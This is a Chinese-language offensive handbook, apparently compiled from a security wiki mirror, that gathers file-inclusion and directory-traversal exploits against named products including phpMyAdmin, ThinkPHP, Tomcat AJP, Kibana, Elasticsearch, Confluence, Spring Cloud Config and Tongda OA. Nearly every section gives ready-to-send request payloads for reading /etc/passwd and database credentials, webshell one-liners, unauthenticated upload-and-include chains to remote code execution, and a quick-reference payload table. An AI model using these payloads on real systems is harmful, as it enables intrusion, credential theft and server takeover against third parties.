# wiki.96.mk 文件包含/目录穿越 POC 整合手册（2026-08-14）

> 来源：[wiki.96.mk](https://wiki.96.mk/)（= nosafer/nosafer.github.io 的 MkDocs 站点）
> 处理方式：全量 988/995 篇 markdown 镜像入库 `../payloads/wiki96_mirror/`（可 grep 原文），本篇精炼全部 **32 篇**文件包含/目录穿越相关文章的可打 Payload + 利用链要点。
> 与 `kb_pati_file_inclusion_poc_2026.md`（通用 LFI 技术链）互补：PATI 管"手法"，本篇管"产品打点"。镜像路径列在各节标题下，`../payloads/wiki96_mirror/Web安全/<产品>/`。

---

## A. PHP CMS / 应用类

### A1. 74cms v6.0.48 — 模板注入+日志包含 RCE
- 镜像：`Web安全/74cms/74cms v6.0.48模版注入+文件包含getshell.md`
- Payload（**必须 POST**，GET 不生效）：
```
POST /index.php?m=Search&a=index
variable=1&tpl=%3C?php%20eval($_POST[a]);?%3E
```
- 链：PHP 码写入日志 → 包含 `data/Runtime/Logs/Home/日期.log` 触发解析。

### A2. CmsEasy 7.3.8 — 后台本地文件包含
- 镜像：`Web安全/CmsEasy/ CmsEasy 7.3.8 本地文件包含漏洞 .md`
- 点：`language_admin.php edit_action` include 无校验；上传图片马后包含。

### A3. CatfishCMS 4.6.15 — 后台文件包含（GD 二次渲染图种）
- 镜像：`Web安全/CatfishCMS/CatfishCMS 4.6.15 后台文件包含getshell.md`
- 链：TP 模板函数 include 可控 → 上传 **GD 二次渲染仍保留**的图片马（`jpg_payload.php`）→ 包含执行。

### A4. Imcat（贴心猫）4.2 — 后台 sql shell 文件包含
- 镜像：`Web安全/Imcat/ Imcatcms 4.2 后台文件包含getshell .md`
- 点：sql shell 功能 `$part` 参数直接进 `include`。**默认无该参数，需自行抓包添加**，指向已上传图片马地址。
- 绕过：`ins.dbsql` 用于绕过两个 if 判断进入 include 代码块。

### A5. PbootCMS v2.0.7 — 前台任意文件包含（双写绕过）
- 镜像：`Web安全/PbootCMS/PbootCMS v2.0.7 前台任意文件包含漏洞.md`
- 链：`TagController::index()` → `parser($this->htmldir . $tagstpl)`，`$tagstpl=request('tagstpl')` 可控。过滤 `preg_replace('/\.\.(\/|\\\)/', '', ...)` 可**双写 `..././` 绕过** → 读取任意文件 → 编译缓存写入 → include。
- Payload 形态：`/tag/{tag}?tagstpl=<路径穿越>`，支持绝对路径模板（以 `/` 开头）。

### A6. Phpcms V9.6.3 — 后台搜索建议接口文件包含
- 镜像：`Web安全/Phpcms/Phpcms V9.6.3 文件包含漏洞.md`
- Payload：
```
GET /index.php?m=search&a=public_get_suggest_keyword&q=../../phpsso_server/caches/configs/database.php
```
- 直接读 phpsso_server 数据库配置（可拿 DB 凭据）。

### A7. phpMyAdmin CVE-2018-12613 — RFI（读 session / frm 文件）
- 镜像：`Web安全/Phpmyadmin/（CVE-2018-12613）Phpmyadmin 远程文件包含漏洞.md`
- 影响：4.8.0 / 4.8.1。需已登录。
- 读文件 Payload：
```
GET /index.php?target=db_sql.php%253f/../../../../../../etc/passwd
```
- **getshell 姿势一**：`SELECT '<?php phpinfo()?>'` 写入当前会话 → 包含 session 文件：
```
GET /index.php?target=db_sql.php%253f/../../../../../../phpStudy/tmp/tmp/sess_<cookie中phpMyAdmin值>
```
- **姿势二**：数据表里 `INSERT` 一句话（**必须 GET 才能出 frm**）→ 包含数据库目录下生成的 `.frm`：
```
GET /index.php?9ouu=phpinfo();&target=db_sql.php%253f/../../../../../../phpStudy/MySQL/data/9ouu/test.frm
```

### A8. phpMyAdmin CVE-2018-19968 — Transformation 文件包含
- 镜像：`Web安全/Phpmyadmin/（CVE-2018-19968）Phpmyadmin 文件包含漏洞.md`
- 影响：4.8.0~4.8.3。需登录（默认 root/toor）。
- 链：
  1. 建库建表写入 PHP：`CREATE DATABASE foo; CREATE TABLE foo.bar(baz VARCHAR(100) PRIMARY KEY); INSERT INTO foo.bar SELECT '<?php phpinfo();?>';`
  2. `chk_rel.php?fixall_pmadb=1&db=foo` 生成 pma 配置表
  3. 篡改 `pma__column_info` 插入 traversal 路径指向 session：
```sql
INSERT INTO pma__column_info SELECT '1','foo','bar','baz','plop','plop','plop','plop','../../../../../../../../tmp/sess_<会话ID>','plop';
```
  4. 访问 `tbl_replace.php?db=foo&table=bar&where_clause=1=1&fields_name[multi_edit][][][]=baz&clause_is_unique=1` 触发包含。

### A9. phpMyAdmin CVE-2014-8959 — 本地文件包含（%00 截断）
- 镜像：`Web安全/Phpmyadmin/（CVE-2014 -8959）Phpmyadmin 本地文件包含漏洞.md`
- 影响：4.0.1~4.2.12，**PHP < 5.3.4**。
- Payload（token 换成真实值）：
```
GET /gis_data_editor.php?token=<token>&gis_data[gis_type]=/../../../../phpinfo.txt%00
```
- 实战：先写文件到 `/tmp` 再包含 RCE。

### A10. Pluck CMS ≤4.7.10 — 语言模块注入文件包含（全版本通杀）
- 镜像：`Web安全/Pluck cms/Pluck CMS 4.7.10 后台 文件包含+文件上传导致getshell.md`
- 链：后台 `language.php` 保存 `langpref` 到 `\data\settings\langpref.php`（内容可控）→ 该参数对应文件被**全局自动包含** → 值指向上传的图种文件 → 解析一句话。
- 上传点白名单但**不重命名**，路径可猜解。
- Payload 形态：save 时 `cont1` ≠ 当前 `$langpref` 即可进入 save_language → save_file → 写 php。

### A11. ThinkPHP 5.0.0~5.0.18 / 5.1.0~5.1.10 — extract 变量覆盖文件包含
- 镜像：`Web安全/Thinkphp/Thinkphp 5.x 漏洞/5.0.0 _= Thinkphp _=5.0.18 文件包含漏洞.md`（5.1 同内容）
- 点：`Template::fetch()` → `File::read()` 中 `extract($vars)`（用户可控）覆盖 `$cacheFile` → include。
- 触发前提：控制器存在 `$this->assign(request()->get()); return $this->fetch();` 模式（如 Index 控制器未过滤参数）。
- Payload：
```
GET /index.php/index/index/index?cacheFile=uploads/图片马路径
```
- 修复对比：5.0.19 把 cacheFile 存 `$this->cacheFile`，extract 后再取，无法覆盖。

### A12. Thinkphp Shop — 供应商后台文件包含提权
- 镜像：`Web安全/Thinkphp shop/Thinkphp Shop 供应商后台本地文件包含导致权限提升.md`
- 链：用户个人资料 `Home/User/info.html` 上传图片末尾加一句话 → 供应商后台订单打印模板参数包含：
```
GET /supplier/order/delivery_print?template=public/upload/user/<uid>/head_pic/<md5>.png&w=phpi
```

### A13. XDCMS 1.0 — 前台文件包含（%00 截断）
- 镜像：`Web安全/XDCMS/XDCMS 1.0 任意文件包含漏洞.md`
- 前提：**PHP < 5.3** 才能 %00 截断。
- Payload：
```
GET /api/index.php?c=xxxxxx%00dama.php
```

### A14. Xfilesharing ≤2.5.1 — 前台 LFI + 短代码 RCE
- 镜像：`Web安全/Xfilesharing/（CVE-2019-18952）Xfilesharing 2.5.1本地文件包含.md`
- Payload（免认证读模板）：
```
GET /?op=page&tmpl=../../admin_settings
```
- `.html` 扩展名硬编码 → 目标文件须带 html 后缀。与上传合并：上传 `upload.html` 改 sid 穿越到 `/tmp`：
```
GET /?op=page&tmpl=../../../../../../../tmp/upload
```
- 脚本内置短代码引擎 → 模板可控即 RCE。

### A15. 狂雨CMS — 后台模板编辑文件包含
- 镜像：`Web安全/狂雨cms/狂雨CMS后台文件包含getshell.md`
- 链：后台**模板编辑功能** `application/admin/controller/Template.php edit()` 写文件无过滤（`File::put` 直接 `file_put_contents`）→ 在模板里写 TP 标签包含图片马：
```html
{include file="uploads/config/20200325/<md5>.jpg" /}
```
- 坑：图片马必须带结尾 `?>` 否则语法错误；路径**不能以 / 开头**；图片上传走 **logo 上传**（头像上传会缩放破坏图马）。

### A16. PHP 通用 — phpinfo 条件竞争包含临时文件 RCE
- 镜像：`Web安全/Php/Php文件包含漏洞（利用phpinfo）.md`
- 原理：POST 带 multipart 文件区块 → PHP 生成 `/tmp/phpXXXXXX` 临时文件（请求结束删除）→ phpinfo 回显 `$_FILES` 里的 tmp_name → 原生 socket 分 4096 块读，**读到文件名立即**并发发第二个包含请求（此时首个 socket 连接未结束、临时文件未删）→ 条件竞争 getshell。
- 效果：执行后写入持久文件 `/tmp/g` = `<?=eval($_REQUEST[1])?>`，后续任意访问 LFI 点命令执行。完整 Python 脚本在镜像文章内（phpInfoLFI + ThreadWorker 多线程）。

---

## B. Java 应用类

### B1. Tomcat CVE-2020-1938 Ghostcat — AJP 文件包含 + RCE
- 镜像：`Web安全/Tomcat/（CVE-2020-1938）Apache Tomcat 文件包含漏洞.md`
- 影响：Tomcat 6 / 7<7.0.100 / 8<8.5.51 / 9<9.0.31；**AJP 8009 默认开启 0.0.0.0**。
- 原理：AJP 协议 `req_attribute` 设置 `javax.servlet.include.request_uri/path_info/servlet_path` 三个属性 → 控制 DefaultServlet 的 getRelativePath → 读 `WEB-INF/web.xml` 等任意 webapps 内文件（出不了 webapps 目录，但任意子目录可读）。
- 读文件（PoC 工具 `cve-2020-1938-poc.py -l -f WEB-INF/web.xml target`）核心包体：
```
GET /ROOT/  (AJP 8009, attrs:)
  javax.servlet.include.request_uri = /
  javax.servlet.include.path_info   = WEB-INF/web.xml
  javax.servlet.include.servlet_path = /
```
- **RCE 链**：AJP GET 打 `*.jsp` 路径进 JspServlet → 配合 jsp 文件包含（先上传 1.txt 内容为 JSP 代码，再 AJP 包含 `/upload/` + `1.txt`）→ JspServlet 解析执行。PoC：
```
"HTTP/1.1" "/1.jsp" ... attributes:
  javax.servlet.include.request_uri : /
  javax.servlet.include.path_info   : 1.txt
  javax.servlet.include.servlet_path : /upload/
```

### B2. Kibana 5.6.13~6.4.3 CVE-2018-17246 — Local File Inclusion
- 镜像：`Web安全/Kibana/（CVE-2018-17246）Kibana Local File Inclusion.md`
- Payload：
```
GET /api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../../etc/passwd
```
- 返回只有 500，但日志可见 `/etc/passwd` 已包含 → 无回显。
- RCE：先上传 JS（如 `/tmp/vulhub.js`）→ 包含，JS 里 `require("child_process").execSync(...)` 执行命令（Node 环境）：
```js
export default {asJson: function() {return require("child_process").execSync("id").toString()}}
```

### B3. ElasticSearch CVE-2015-3337 — site 插件目录穿越
- 镜像：`Web安全/Elasticsearch/（CVE-2015-3337）ElasticSearch 目录穿越漏洞.md`
- Payload（head 插件目录穿越读任意文件）：
```
GET /_plugin/head/../../../../../../../../etc/passwd
```

### B4. ElasticSearch CVE-2015-5531 — snapshot 目录穿越（错误信息泄露）
- 镜像：`Web安全/Elasticsearch/（CVE-2015-5531）ElasticSearch 目录穿越漏洞.md`
- 影响：1.6.1 以下；新版需配置 `path.repo`。
- 链：
  1. `PUT /_snapshot/test`（type fs, location 可写目录）
  2. `PUT /_snapshot/test2`（location 为子目录）
  3. 穿越访问，**错误信息里带文件内容**（编码后）：
```
GET /_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
```

### B5. Gitea 1.4.0 — Git LFS 目录穿越 RCE
- 镜像：`Web安全/Gitea/Gitea 1.4.0 目录穿越导致命令执行漏洞.md`
- 链：公开仓库先建 LFS 对象，Oid 参数穿越：
```
POST /<owner>/<repo>.git/info/lfs/objects
{"Oid":"....../../../etc/passwd","Size":1000000,...}
```
- 读取：
```
GET /<owner>/<repo>.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth
```
- 完整链可到命令执行（参考文章第二参考链接）。

### B6. Confluence CVE-2019-3396 — 路径穿越 + Velocity SSTI RCE
- 镜像：`Web安全/Confluence/（CVE-2019-3396）Confluence 路径穿越与命令执行漏洞.md`
- 点：`/rest/tinymce/1/macro/preview` 的 `_template` 参数穿越，配合 Velocity 模板 SSTI。
- 链：`ftp://` 从攻击机加载 `rce.vm`（Velocity RCE 模板）→ 命令执行。

### B7. Confluence CVE-2019-3398 — drag-and-drop 上传穿越写 Shell
- 镜像：`Web安全/Confluence/（CVE-2019-3398）Confluence 路径穿越漏洞.md`
- 点：`/rest/wikirenderer/.../dragdrop` 上传接口 `filename` 参数穿越 → 写 webshell 到 webroot，两步利用。

---

## C. 容器 / 中间件目录穿越

### C1. Nginx — alias 配置错误目录穿越
- 镜像：`Web安全/Nginx/Nginx 配置错误漏洞 目录穿越漏洞.md`
- 错误配置：
```nginx
location /files { alias /home/; }   # 少了结尾 /
```
- Payload（穿越到根目录）：
```
GET /files../
```

### C2. Node.js CVE-2017-14849 — normalize 逻辑错误目录穿越
- 镜像：`Web安全/Node.js/（CVE-2017-14849）Node.js 目录穿越漏洞.md`
- 影响：Node 8.5.0（8.6 修复），express 静态文件服务受影响。
- 原理：`../../../foo/../../../../etc/passwd` 中间插 `foo/../` 使 `normalize` 返回 `/etc/passwd` 而实际路径越界 → 绕过越界检查。
- Payload：
```
GET /static/../../../a/../../../../etc/passwd
```

### C3. uWSGI <2.0.17 CVE-2018-7490 — PHP 插件目录穿越
- 镜像：`Web安全/uWSGI/（CVE-2018-7490）uWSGI PHP目录穿越漏洞.md`
- 点：PHP 插件未正确处理 `DOCUMENT_ROOT`，`..%2f` 跨界读/执行文件。
- Payload：
```
GET /..%2f..%2f..%2f..%2f..%2fetc/passwd
```

### C4. Ruby on Rails CVE-2019-5418 — Accept 头路径穿越
- 镜像：`Web安全/Ruby On Rails/（CVE-2019-5418）Ruby on Rails 路径穿越与任意文件读取漏洞.md`
- 影响：< 6.0.0.beta3 / < 5.2.2.1 / < 5.1.6.2 / < 5.0.7.2。
- 点：控制器 `render file` 渲染应用外视图时用 Accept 头定位文件；`../` + 前缀组合穿越，`{{` 闭合后缀。
- Payload：
```
GET /robots
Accept: ../../../../../../../../etc/passwd{{
```
- 解析结果 `/etc/passwd{{}{,}{.{raw,erb,html,...},}` → `/etc/passwd` 被当模板渲染 → 任意文件读取。

---

## D. Spring Cloud Config 目录穿越

### D1. CVE-2020-5405 — `(_)` 占位符穿越（native profile）
- 镜像：`Web安全/Spring Cloud/（CVE-2020-5405）Spring Cloud Config Server 目录穿越漏洞.md`
- 影响：Config Server 2.2.0-2.2.1 / 2.1.0-2.1.6。
- 原理：label 中 `(_)` 会被替换为 `/`（SLASH_PLACEHOLDER），需 `spring.profiles.active=native` + `search-locations` 本地加载，否则走 git checkout 直接异常。
- Payload：
```
GET /1/1/..(_)..(_)..(_)..(_)..(_)..(_)..(_)..(_)..(_)etc/passwd
```
URL 编码变体：`..%28_%29..%28_%29...etc/passwd`

### D2. CVE-2020-5410 — `#` 锚点绕后缀 + `(_)` 穿越
- 镜像：`Web安全/Spring Cloud/（CVE-2020-5410）Spring Cloud Config 目录穿越漏洞.md`
- 影响：2.2.x<2.2.3 / 2.1.x<2.1.9。
- 原理：`url = env-uri + label + name + extension`；用 `%23`(#) 在 name 末尾结尾使 extension 变锚点绕后缀；`(_)` 占位符穿越；label/name 均可控。
- Payload（穿越到 /tmp）：
```
GET /flag.txt%23/222/..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29..%28_%29tmp%28_%29
```
- 或 name 处直接二次编码穿越：
```
GET /..%252F..%252F..%252F..%252F..%252F..%252F..%252Ftmp%252Fflag.txt%23/222/11
```
- 坑：直接 `../../` 不行（一次解码后文件存在性检查就失败），必须用 `(_)` 或二次编码。

---

## E. 通达 OA 文件包含（两洞）

### E1. 通达 OA — gateway.php 文件包含 + 任意文件上传 RCE（全版本）
- 镜像：`Web安全/通达oa/通达oa 任意文件上传+rce+文件包含.md`
- 影响：V11/2017/2016/2015/2013增强/2013。
- **未授权任意文件上传**（`ispirit/im/upload.php`，POST 带 `P` 即绕过认证自动建 session，`DEST_UID` 需非 0）：
```
POST /ispirit/im/upload.php
UPLOAD_MODE=2  P=123  DEST_UID=1  ATTACHMENT=<php一句话>
```
- 上传后缀检测用 `name.php.` 绕过；文件存 `attach/im/<年>/<月>/`（不在 webroot，**必须靠包含**）。
- **文件包含点**：`/ispirit/interface/gateway.php`（2017 在 `/mac/gateway.php`），`json` 参数里 `url` 值需含 `general/` 或 `ispirit/` 或 `module/` 才会 include_once：
```
POST /mac/gateway.php
json={"url":"/general/../../attach/im/2003/<attchid>.jpg"}
```
- 免上传替代：写 nginx/日志后包含日志 getshell（2015 无文件包含，但 2017 补丁没修，日志包含广泛可用）：
```
POST /api/ddsuite/error.php  message=<?php file_put_contents("2.php",base64_decode("..."));?>52011
POST /mac/gateway.php  json={"url":"..\/..\/logs\/oa\/2003\/dd_error.log"}
```

### E2. 通达 OA 2013/2015 — menu_left.php 文件包含
- 镜像：`Web安全/通达oa/通达oa 文件包含漏洞.md`
- Payload：
```
GET /inc/menu_left.php?GLOBALS[MENU_LEFT][A][module][1]=a&include_file=../inc/js/menu_left.js
```
- 实战链：控制面板上传 jpg 头像（`attachment/avatar/XXX.jpg`）→ 包含执行 → getshell。根目录一般 `D:\MYOA\webroot`。

---

## 速查索引

| 场景 | Payload 一句话 | 详见 |
|------|----------------|------|
| Phpcms 读 DB 配置 | `?m=search&a=public_get_suggest_keyword&q=../../phpsso_server/caches/configs/database.php` | A6 |
| phpMyAdmin 读文件 | `?target=db_sql.php%253f/../../.../etc/passwd` | A7-A9 |
| ThinkPHP extract 覆盖 | `?index/index/index?cacheFile=uploads/x.jpg` | A11 |
| PbootCMS 双写穿越 | `tagstpl=..././...`（双写 `..`） | A5 |
| 通达 OA 上传+包含 | upload.php(P/DEST_UID) → gateway.php json url | E1 |
| Tomcat AJP | 8009 发包 `req_attribute` 三属性 | B1 |
| Kibana | `api_server?apis=../../.../etc/passwd` | B2 |
| ES 插件穿越 | `/_plugin/head/../../.../etc/passwd` | B3 |
| Rails | `Accept: ../../.../etc/passwd{{` | C4 |
| Spring Config | `..(_)..(_)...` / `name%23` 锚点 | D1/D2 |
| Nginx alias | `/files../` | C1 |
| Node normalize | `/static/../../../a/../../.../etc/passwd` | C2 |
| uWSGI | `/..%2f..%2f..%2f.../etc/passwd` | C3 |
| Xfilesharing | `?op=page&tmpl=../../admin_settings` | A14 |
| phpinfo 竞争包含 | 上传临时文件+条件竞争 | A16 |
